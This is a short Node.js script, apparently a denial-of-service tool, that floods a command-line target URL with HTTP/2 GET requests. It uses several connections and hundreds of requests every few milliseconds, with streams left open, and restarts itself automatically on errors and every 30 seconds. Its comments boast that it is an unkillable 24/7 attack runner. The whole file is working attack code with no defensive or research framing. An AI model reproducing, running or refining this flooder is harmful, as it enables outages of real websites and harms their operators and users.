const http2 = require('http2');

class H2_UNKILLABLE {
    constructor(target) {
        this.target = target;
        this.host = target.replace('https://', '').replace('http://', '').split('/')[0];
        this.running = true;
        
        console.log('STARTED');
        
        // FORCE AUTO-RESTART ON ANY CRASH
        process.on('uncaughtException', () => this.hardRestart());
        process.on('unhandledRejection', () => {});
        
        // MAIN LOOP WITH TRY-CATCH
        this.mainLoop();
    }
    
    mainLoop() {
        try {
            // CREATE FRESH CONNECTIONS EACH LOOP
            this.connections = [];
            for (let i = 0; i < 5; i++) {
                this.createConn(i);
            }
            
            // BULLETPROOF ATTACK LOOP
            const attack = () => {
                if (!this.running) return;
                
                try {
                    this.connections.forEach(conn => {
                        if (conn && !conn.destroyed) {
                            // FIRE 100 REQUESTS PER CONNECTION
                            for (let j = 0; j < 100; j++) {
                                try {
                                    const req = conn.request({
                                        ':method': 'GET',
                                        ':path': '/',
                                        ':authority': this.host
                                    });
                                    req.end();
                                    // DO NOT CLOSE - LET IT DIE NATURALLY
                                } catch(e) {
                                    // IGNORE
                                }
                            }
                        }
                    });
                    
                    // NEXT BATCH
                    setTimeout(attack, 10);
                    
                } catch(e) {
                    // RESTART ON ANY ERROR
                    this.hardRestart();
                }
            };
            
            // START
            setTimeout(attack, 100);
            
            // AUTO-RESTART EVERY 30s (PREVENT GC CRASH)
            this.restartTimer = setTimeout(() => {
                this.hardRestart();
            }, 30000);
            
        } catch(e) {
            this.hardRestart();
        }
    }
    
    createConn(id) {
        try {
            const conn = http2.connect(this.target, {
                maxSessionMemory: 8192, // TINY MEMORY
                maxSendHeaderBlockLength: 1024
            });
            
            // NO ERROR HANDLERS - LET IT CRASH
            conn.on('error', () => {});
            
            this.connections[id] = conn;
        } catch(e) {
            // IGNORE
        }
    }
    
    hardRestart() {
        // KILL EVERYTHING
        this.running = false;
        
        if (this.restartTimer) {
            clearTimeout(this.restartTimer);
        }
        
        // DESTROY CONNECTIONS
        if (this.connections) {
            this.connections.forEach(conn => {
                try { if (conn) conn.destroy(); } catch(e) {}
            });
        }
        
        // RESTART AFTER 1s
        setTimeout(() => {
            this.running = true;
            this.mainLoop();
        }, 1000);
    }
    
    stop() {
        this.running = false;
        if (this.restartTimer) clearTimeout(this.restartTimer);
        if (this.connections) {
            this.connections.forEach(conn => {
                try { if (conn) conn.destroy(); } catch(e) {}
            });
        }
    }
}

// ULTIMATE 24/7 RUNNER
let instance = null;

function launch() {
    if (process.argv.length < 3) {
        console.log('node unkillable.js https://target.com');
        process.exit(1);
    }
    
    instance = new H2_UNKILLABLE(process.argv[2]);
    
    // RESTART ON SIGINT TOO
    process.on('SIGINT', () => {
        if (instance) instance.stop();
        process.exit(0);
    });
}

// CATCH EVERY POSSIBLE CRASH
process.on('uncaughtException', () => {
    setTimeout(launch, 1000);
});

process.on('unhandledRejection', () => {});

// START
launch();
